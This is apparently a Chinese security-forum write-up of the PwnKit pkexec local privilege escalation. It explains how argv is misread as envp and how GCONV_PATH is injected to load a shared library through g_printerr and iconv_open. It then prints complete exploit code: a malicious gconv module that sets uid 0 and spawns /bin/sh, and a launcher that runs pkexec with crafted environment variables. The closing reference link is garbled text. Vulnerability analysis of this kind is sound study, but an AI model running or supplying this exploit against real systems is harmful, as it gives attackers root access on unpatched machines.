
```c
validate_environment_variable (const gchar *key,
                                const gchar *value)
{
  ...
  log_message (LOG_CRIT, TRUE,
               "The value for the SHELL variable was not found the /etc/shells file");
  g_printerr ("\n"
              "This incident has been reported.\n");
}
```

1. `g_printerr()` 正常情况下是为了以 UTF-8 编码格式打印错误信息。

2. 如果环境变量中的 `CHARSET != UTF-8`，它同样能够以其他编码方式打印错误信息。（`CHARSET` 环境变量不属于不安全环境变量）

3. `g_printerr()` 会调用 glibc 的 `iconv_open()` 函数将 UTF-8 格式的信息转为其他格式。

4. 为了转换格式，`iconv_open()` 会调用一个共享库函数。

5. 正常情况下，找到系统提供的 `gconv-modules` 文件，然后从中拿到需要的共享库函数。

6. 之后会调用对应文件中的 `gconv()` 函数和 `gconv_init()` 函数。

7. 但是通过环境变量 `GCONV_PATH` 可以强制指定 `iconv_open()` 读取某一个特定的共享库。

8. 问题：`GCONV_PATH` 是不安全函数，不会被加载到程序中。

9. `pkexec` 可以将 `GCONV_PATH` 环境变量重新载入。**为什么？**

**到目前位置所知道的信息：**

1. `pkexec` 可以将 `envp` 错误识别为 `argv`。
2. `pkexec` 使用的 `g_printerr()` 会使用 `iconv_open()` 加载某一个共享库识别其他字符，并且可以通过 `GCONV_PATH` 环境变量控制共享库的路径。
3. `pkexec` 具有 suid 权限。

### 2.4 POC分析

到这里，基本上就已经明确了所有步骤：

1. 构造执行 shell 的文件，编译为 so 文件。
2. 向 `pkexec` 写入环境变量，控制 `GCONV_PATH`，使得 shell 可以被链接到程序上。
3. 使 `pkexec` 能够运行错误输出函数 `g_printerr()`，触发具有 shell 的 `so`。

回到源码，分析调用链。

1. 在 534 行进入循环，`n` 从 1 开始便利 `for (n = 1; n < (guint) argc; n++)`。
2. 在 610 行会将 `argv[1]` 取出，`path` 指向它：`path = g_strdup (argv[n]);`。
3. 在 629 行对 `path` 参数校验，不是以 `/` 开头，进去判断居于。
4. 在 632 行将 `path` 传递给 `s`：`s = g_find_program_in_path (path);` 注：`g_find_program_in_path()` 是 Glib 函数，作用在 `PATH` 环境变量的目录中搜索一个名为 `path` 的文件。
5. 在 639 行 `argv[n] = path = s`。
6. 在 670 行 `if (!validate_environment_variable (key, value))` 会对环境变量进行合法性校验，此时如果报错会调用 `g_printerr()`。
7. 在 702 行会对环境变量进行清除操作：`if (clearenv () != 0)`。

假设存在环境变量 `PATH=name`，如果 `name` 存在，并且 `name` 目录中有一个名为 `path` 的文件，传递给 `envp[0]`。

如果 `PATH=name=.` 并且有一个目录 `name=.`，此目录中有一个 `shell.so:.`，那么这个 `shell.so:.` 会被传递给 `argv[1]` -> `envp[0]`。

如果在开始，使用 `execve()` 执行 `pkexec`，并且传递第一个参数为 `NULL`，那么在第二步，一开始读取的 `argv[1]` 实际上是 `envp[0]`。

并且后续会找到一个可执行文件传递给 `s`，继而传递给 `argv[1]`，注意 `argv[1]` 指向的实际上是第一个环境变量。

通过这种方式，就能修改掉第一个环境变量。

### 2.5 利用

```c
// pwnkit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
    char * const args[] = { "/bin/sh", NULL };
    char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
    setuid(0);
    setgid(0);
    execve(args[0], args, environ);
    exit(0);
}
```

```c
// exp.c
#include <unistd.h>

int main(int argc, char **argv)
{
    char * const args[] = {
        NULL
    };
    char * const environ[] = {
        "pwnkit.so:.",
        "PATH=GCONV_PATH=.",
        "SHELL=/lol/i/do/not/exists",
        "CHARSET=PWNKIT",
        "GIO_USE_VFS=",
        NULL
    };
    return execve("/usr/bin/pkexec", args, environ);
}
```

构造环境变量如上图，按 POC 所叙述：

1. 首先会将 `pwnkit.so:.` 传递给 `g_find_program_in_path()` 函数，在环境变量中 `PATH` 的目录 `GCONV_PATH=.` 中寻找 `pwnkit.so:.`，最后找到的以 `PATH` 目录为起始位置的路径是 `GCONV_PATH=./pwnkit.so:.`。
2. 这个绝对路径会被写入 `envp[0]`。
3. 此时系统中具有异常的环境变量 `GCONV_PATH=./pwnkit.so:.`。
4. 利用 `SHELL` 环境变量构造报错，调用 `g_printerr()` 函数。
5. 此时由于 `CHARSET != UTF-8`，所以会调用 `iconv_open()` 函数。
6. 由于上面设置了 `GCONV_PATH`，所以此时会将 `./pwnkit.so` 错误的作为库函数加载并执行。

## 参考

64eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2I4N6h3q4D9P5i4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6t1J5i4K6u0r3x3o6q4Q4x3V1j5J5y4g2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0q4Q4x3X3b7@1x3o6x3@1i4K6u0r3M7s2N6F1K9$3W2@1i4K6u0W2N6s2S2@1

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2023-4-12 09:56 被安和桥南编辑，原因：找了下之前的参考文献

[#基础知识](https://bbs.kanxue.com/forum-171-1-180.htm)

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
